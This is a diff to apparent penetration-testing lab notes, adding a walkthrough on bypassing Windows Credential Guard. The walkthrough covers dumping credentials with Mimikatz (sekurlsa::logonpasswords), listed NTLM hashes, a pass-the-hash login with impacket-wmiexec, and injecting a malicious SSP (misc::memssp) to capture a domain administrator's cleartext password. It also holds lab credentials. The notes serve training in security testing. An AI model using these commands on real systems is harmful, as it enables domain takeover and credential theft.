@@ -1613,7 +1613,36 @@ Install Wsgidav (Web Distributed Authoring and Versioning): allow clients to upl
     - Using the dir command to create an SMB connection to our Kali machine
       `dir \\192.168.45.181\test` in web portal os command  
   - Windows credential guard
-- 16.2.1
+    - Logging in to the **CLIENTWK248** machine as a **Domain Administrator**
+      `xfreerdp3 /u:"CORP\\Administrator" /p:"QWERTY123\!@#" /v:192.168.133.248 /dynamic-resolution` > sign out of administrator  
+    - Logging in to the **CLIENTWK246** as offsec, which is a **local administrator**
+      `xfreerdp3 /u:"offsec" /p:"lab" /v:192.168.133.246 /dynamic-resolution`
+    - Run terminal as Administrator > cd C:\tools\mimikatz\ > .\mimikatz.exe  
+    - Enable SeDebugPrivilege for our local user and then dump all the available credentials with sekurlsa::logonpasswords
+      ```
+      privilege::debug
+      sekurlsa::logonpasswords
+
+      #hashes
+      NTLM 246 local admin (offsec): 2892d26cdf84d7a70e2eb3b9f05c425e
+      NTLM 248 domain admin (administrator): 160c0b16dd0ee77e7c494e38252f7ddf
+      ```
+    - Gain access to SERVERWK248 machine as CORP\Administrator (pass the hash)
+      `impacket-wmiexec -debug -hashes 00000000000000000000000000000000:160c0b16dd0ee77e7c494e38252f7ddf CORP/Administrator@192.168.50.248`
+    - **Circumvented Credential Guard by injecting SSP through Mimikatz**
+      - Credential Guard is only designed to protect non-local users  
+      - Logging in to the CLIENTWK245 machine as a Domain Administrator that has credential guard
+      - Logging in to the CLIENTWK245 machine as a local adminstrator
+      - windows terminal run as administrator > Get-ComputerInfo > hashes encrypted
+      - Injecting a malicious SSP using Mimikatz
+        ```
+        privilege::debug
+        misc::memssp
+        ```
+      - close the current RDP (wait another user connect to machine) - Logging in to the **CLIENTWK245** machine as a **Domain Administrator**
+      - close the current RDP window and connect to the **CLIENTWK245** as **offsec**
+      - type C:\Windows\System32\mimilsa.log (credentials)  
+        [00000000:00af2311] CORP\Administrator  QWERTY123!@#
 
 ## Penetration testing report 
 - note editor:
